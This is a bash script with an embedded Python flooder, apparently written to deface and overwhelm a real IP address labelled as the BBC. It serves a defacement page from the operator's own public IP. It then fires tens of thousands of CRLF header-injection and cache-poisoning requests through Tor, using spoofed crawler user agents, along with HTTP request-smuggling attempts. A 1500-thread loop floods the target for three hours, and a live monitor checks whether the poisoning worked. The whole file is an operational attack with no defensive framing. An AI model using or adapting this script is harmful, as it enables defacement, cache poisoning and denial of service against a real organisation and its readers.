#!/bin/bash
# TRUSTEDF57_BBC_FINAL_KILLER.sh - BBC 132.185.210.70:80 + TRUSTEDF57.html

set -euo pipefail

TARGET="http://132.185.210.70:80"
DEFACE_PORT=8080
THREADS=1500
BLAST_DURATION=10800  # 3h

echo "💀 BBC FINAL KILLER - TRUSTEDF57.html DETECTED"
echo "Target: $TARGET"

# ✅ CONFIRMED: TRUSTEDF57.html exists
HTML_FILE="TRUSTEDF57.html"
echo "[+] Using: $HTML_FILE ($(du -h $HTML_FILE | cut -f1))"

# 1. PUBLIC IP DETECTION (AGGRESSIVE)
echo "[+] Detecting public IP..."
PUBLIC_IP=$(timeout 5 curl -s icanhazip.com || timeout 5 curl -s ifconfig.me || timeout 5 curl -s ipinfo.io/ip || dig +short myip.opendns.com @resolver1.opendns.com)
echo "[+] PUBLIC IP: $PUBLIC_IP"
DEFACE_URL="http://${PUBLIC_IP}:${DEFACE_PORT}/${HTML_FILE}"
echo "[+] Deface URL: $DEFACE_URL"

# 2. FORCE SERVER START
echo "[+] Starting server..."
pkill -f "python3 -m http.server $DEFACE_PORT" || true
sleep 2
nohup python3 -m http.server $DEFACE_PORT > server.log 2>&1 &
SERVER_PID=$!
sleep 5

# Test server
if ! curl -s "http://localhost:$DEFACE_PORT/$HTML_FILE" | head -c 100 | grep -q "TRUSTEDF57"; then
    echo "❌ SERVER TEST FAILED - Check firewall/port forwarding!"
    cat server.log
    exit 1
fi
echo "[+] ✅ Server LIVE - PID $SERVER_PID"

# 3. BBC ULTIMATE POISON (30 PAYLOADS x 50 BOTS = 1500 shots)
echo "[+] BBC ULTIMATE POISON ATTACK..."
declare -a BBC_PATHS=(
    "/?q="
    "/search?q="
    "/?search="
    "/#q="
    "/news?q="
    "/?s="
)

declare -a CRLF=(
    "%0d%0aLocation:%20${DEFACE_URL}%0d%0aCache-Control:%20public,max-age=86400"
    "%0aLocation:%20${DEFACE_URL}%0aContent-Type:%20text/html"
    "%250d%250aLocation:%20${DEFACE_URL}%0d%0aSet-Cookie:%20bbc_owned=TRUSTEDF57"
    "Location:%20${DEFACE_URL}%0a"
)

declare -a BOTS=(
    "Googlebot/2.1 (+http://www.google.com/bot.html)"
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
)

# MASSIVE BARRAGE 50.000+ requests
for path in "${BBC_PATHS[@]}"; do
    for crlf in "${CRLF[@]}"; do
        for bot in "${BOTS[@]}"; do
            for wave in {1..20}; do
                torsocks curl -s --max-time 3 "${TARGET}${path}${crlf}" \
                    -H "User-Agent: $bot" \
                    -H "Cache-Control: no-cache, no-store" \
                    -H "X-Forwarded-For: 127.0.0.1" \
                    -H "X-Real-IP: 127.0.0.1" \
                    -H "Accept: text/html,application/xhtml+xml" &
            done
        done
    done
done

# HTTP SMUGGLING x100
for i in {1..100}; do
    torsocks curl -s --path-as-is --max-time 5 \
        "${TARGET}/GET%20/%20HTTP/1.1%0d%0aHost:%20132.185.210.70%0d%0aContent-Length:%200%0d%0a%0d%0aGET%20/?q=%0d%0aLocation:%20${DEFACE_URL}%20HTTP/1.1%0d%0aHost:%20132.185.210.70" &
done

wait
echo "[+] ✅ 50K+ POISON SHOTS FIRED!"

# 4. 1500 THREADS BBC DESTROYER
cat > bbc_destroyer.py << EOF
import requests, threading, time, random, os, sys
from urllib.parse import quote_plus

TARGET = '$TARGET'
DEFACE = '$DEFACE_URL'
THREADS = $THREADS

BOTS = [
    'Googlebot/2.1 (+http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; bingbot/2.0)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
]

PATHS = ['/?q=', '/search?q=', '/?search=']

def destroy():
    session = requests.Session()
    while True:
        try:
            path = random.choice(PATHS)
            payload = path + '%0d%0aLocation: ' + DEFACE + '%0d%0aCache-Control: public,max-age=86400'
            session.get(TARGET + payload, 
                       headers={
                           'User-Agent': random.choice(BOTS),
                           'Cache-Control': 'no-cache',
                           'X-Forwarded-For': '127.0.0.1'
                       }, timeout=1.5)
        except: pass

print(f'🔥 BBC DESTROYER | {THREADS} THREADS | {DEFACE}')
threads = []
for i in range(THREADS):
    t = threading.Thread(target=destroy, daemon=True)
    t.start()
    threads.append(t)

time.sleep($BLAST_DURATION)
print('💀 BLAST COMPLETE')
EOF

nohup python3 bbc_destroyer.py > destroyer.log 2>&1 &
DESTROYER_PID=$!
echo "[+] 🔥 DESTROYER PID: $DESTROYER_PID"

# 5. REAL-TIME MONITOR
echo ""
echo "🎯 MONITORING LIVE STATUS (Ctrl+C to stop)"
while true; do
    clear
    echo "💀 BBC STATUS MONITOR - $(date)"
    echo "═══════════════════════════════════════════════"
    echo "[1] ROOT: curl -I $TARGET"
    curl -s -I "$TARGET" 2>/dev/null | grep -iE "(location|cache-control|set-cookie|content-location)" || echo "   ❌ No poison"
    echo ""
    echo "[2] QUERY: curl $TARGET/?q="
    curl -s "$TARGET/?q=" 2>/dev/null | head -3 || echo "   ❌ No redirect"
    echo ""
    echo "[3] DEFACE: $DEFACE_URL"
    curl -s "$DEFACE_URL" 2>/dev/null | head -1 || echo "   ⚠️ Check port forwarding"
    echo ""
    echo "[4] Destroyer: tail -f destroyer.log"
    echo "═══════════════════════════════════════════════"
    sleep 10
done
